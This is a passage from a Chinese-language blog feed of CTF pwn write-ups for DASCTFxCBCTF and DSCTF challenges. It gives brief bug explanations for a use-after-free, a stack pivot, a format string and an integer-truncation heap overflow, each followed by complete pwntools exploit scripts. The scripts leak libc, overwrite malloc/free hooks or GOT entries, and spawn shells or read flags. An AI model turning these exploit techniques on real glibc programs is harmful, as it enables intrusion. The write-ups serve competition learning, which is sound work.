class="string">&#x27;read&#x27;</span>])</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">s(orw)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100913703.png" alt="image-20221011105721130"></p>
<p>成功get flag</p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>2022赣育杯</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTFxCBCTF-pwn</title>
    <url>/2022/09/30/DASCTFxCBCTF-pwn/</url>
    <content><![CDATA[<p>DASCTFxCBCTF pwn</p>
<span id="more"></span>

<h1 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h1><p>libc2.31 uaf</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./bar&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">26032</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">n</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">mode, con = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Whisky , brandy or Vodka?&#x27;</span>, <span class="built_in">str</span>(mode))</span><br><span class="line">    sa(<span class="string">b&#x27;You may want to tell sth to the waiter:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx, size</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Which?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;How much?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;We will give everyone only one cup of icecream!\n&#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x1ec6a0</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x1ebb70</span></span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line">one = [<span class="number">0xe6aee</span>, <span class="number">0xe6af1</span>, <span class="number">0xe6af4</span>]</span><br><span class="line">ogg = libcbase + one[<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe6aee execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af1 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af4 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>, <span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">2</span>, <span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xf8</span> + p64(<span class="number">0x421</span>))</span><br><span class="line">delete(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x98</span> + p64(<span class="number">0x51</span>) + p64(malloc_hook - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, p64(ogg))</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Whisky , brandy or Vodka?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h1><p>栈迁移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./appetizer&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25106</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;gdb.attach(io, &#x27;b* $rebase(0x1372)&#x27;)</span></span><br><span class="line"><span class="string">pause()&#x27;&#x27;&#x27;</span></span><br><span class="line">sa(<span class="string">b&quot;Let&#x27;s check your identity&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0x7373656c656d614e</span>))</span><br><span class="line">ru(<span class="string">b&#x27;Here you are:&#x27;</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">base = buf - <span class="number">0x3050</span></span><br><span class="line">base = base - <span class="number">0x1000</span></span><br><span class="line">end = base + <span class="number">0x4050</span></span><br><span class="line">lg(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;buf&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = base + <span class="number">0x3fa0</span></span><br><span class="line">puts_plt = base + <span class="number">0x10B0</span></span><br><span class="line">pop_rdi = base + <span class="number">0x14d3</span></span><br><span class="line">leave_ret = base + <span class="number">0x12d8</span></span><br><span class="line">start = base + <span class="number">0x13D2</span></span><br><span class="line">ret = base + <span class="number">0x101a</span></span><br><span class="line">read_again = base + <span class="number">0x1428</span></span><br><span class="line">pop_rbp = base + <span class="number">0x11f3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x60</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload1 += p64(read_again)</span><br><span class="line">sa(<span class="string">b&#x27;And pls write your own information on it&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(buf + <span class="number">0x60</span> - <span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">sa(<span class="string">b&#x27;Tell me your wish:&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">libcbase = uu64() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libcbase + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libcbase + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rsi = libcbase + <span class="number">0x27529</span></span><br><span class="line">pop_rdx_rbx = libcbase + <span class="number">0x1626d6</span></span><br><span class="line"><span class="comment">#pop_rsi = libcbase + 0x2601f</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;./flag&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">2</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x70</span> + p64(pop_rdi) + p64(buf) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload3 += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(buf + <span class="number">8</span>) + p64(pop_rdx_rbx) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(read_addr)</span><br><span class="line">payload3 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr) </span><br><span class="line">s(payload3)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h1><p>格式化字符串，打puts调用链中的一个函数got表为ogg</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./cyberprinter&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">28514</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your name?pls..&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x17</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">0x1ec5c0</span></span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ABS_got = libcbase + <span class="number">0x1eb0a8</span></span><br><span class="line">one = libcbase + <span class="number">0xe6af1</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span>, &#123;ABS_got:one&#125;)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h1><p>输入size为long int 类型，判断size大小时强制类型转换成了int，由于long int 为8字节，int有4字节，所以转换后只保留低四字节内容，但是后面输入堆块内容时的size是输入的long int类型的，这里可以造成堆溢出，之后打堆重叠即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">27455</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">n</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Note size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Note content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Note ID:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Note ID:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x200</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x200</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x200</span>)   <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100000080</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x631</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x200</span>)  <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libcbase = uu64() - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - <span class="number">96</span></span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x220</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x200</span> + p64(<span class="number">0</span>) + p64(<span class="number">211</span>) + p64(free_hook))   <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x200</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)  <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x200</span>, p64(sys_addr))</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>DASCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DSCTF</title>
    <url>/2022/07/23/DSCTF/</url>
    <content><![CDATA[<p>DSCTF 部分pwn题复现</p>
<span id="more"></span>

<h1 id="fuzzerinstrospector"><a href="#fuzzerinstrospector" class="headerlink" title="fuzzerinstrospector"></a>fuzzerinstrospector</h1><p>输入6的时候有个带参数的函数调用，参数固定为为heap[0]，函数地址用户输入，所以只需要给heap[0]输入&#x2F;bin&#x2F;sh，然后输入system的地址即可getshell，这题的难点在于增加堆块时需要输入内容，这将使我们泄露libc时会把fd指针覆盖导致泄露失败</p>
<p>这里又学到一个新知识，scanf输入+时会读入失败，所以我们只需要写入+就不会覆盖掉fd指针了</p>
<p>释放一个unsorted bin中的堆块和相邻堆块合并放入top chunk，这时top chunk中将会有残留指针，再malloc出来就能泄露libc了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sla(<span class="string">b&quot;Index: &quot;</span> + <span class="built_in">str</span>(i).encode() + <span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;Bitmap: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, payload, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sla(<span class="string">b&quot;Index: &quot;</span> + <span class="built_in">str</span>(i).encode() + <span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(payload[i]).encode())</span><br><span class="line">    sa(<span class="string">b&quot;Bitmap: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    m += i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, m)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">fd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Bit: &#x27;</span>)</span><br><span class="line">    fd += <span class="built_in">chr</span>(<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">libcbase = u64(fd) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys_addr = libcbase + <span class="number">0x4f420</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, m)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(sys_addr))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h1 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h1><p><a href="https://imgtu.com/i/vKnezD"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100916508.jpg" alt="vKnezD.jpg"></a></p>
<p>程序一开始分配了0xa8大小的堆块来管理8个chunk的size，地址，内容的长度，这就导致了申请最后一个chunk时保存的size会把第一个chunk的size覆盖掉，这样就能打堆重叠了，然后再用house of banana getshell即可</p>
